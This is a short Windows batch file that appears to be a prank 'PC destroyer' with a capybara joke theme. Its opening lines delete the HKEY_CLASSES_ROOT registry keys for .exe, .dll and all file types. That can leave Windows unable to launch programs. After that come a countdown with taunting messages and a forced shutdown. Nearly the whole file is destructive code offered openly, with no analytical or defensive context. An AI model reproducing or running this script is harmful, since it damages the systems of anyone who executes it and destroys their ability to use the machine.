echo PC destroyd PC destroyd IF U RESTART I WIL NEVR BOOT UP.
@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
@echo off
:Start
title capybara found u
color 06
echo 7
set /p time=
color 06
:loop
cls
ping localhost -n 2 >nul
set /a time=%time%-1
echo %TIME%
if %time% EQU 0 goto CAPYBARA FOUND U
goto loop
:CAPYBARA FOUND U
title Fat capybara drunc 7up nd nerly clap ur pc
ping locathost -n 2 >nul
ping localhost -n 2 >nul
color 06
echo U got 20 sekonds before capybara gets drunc
ping localhost -n 20 >nul
ping localhost -n 2 >nul
ping localhost -n 2 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul
ping localhost -n 1 >nul
goto Shutdown
:Shutdown
color 06
echo Fat capybara drunc 7up nd clapd ur pc
ping localhost -n 1 >nul
start C:\Windows\System32\Shutdown.exe -s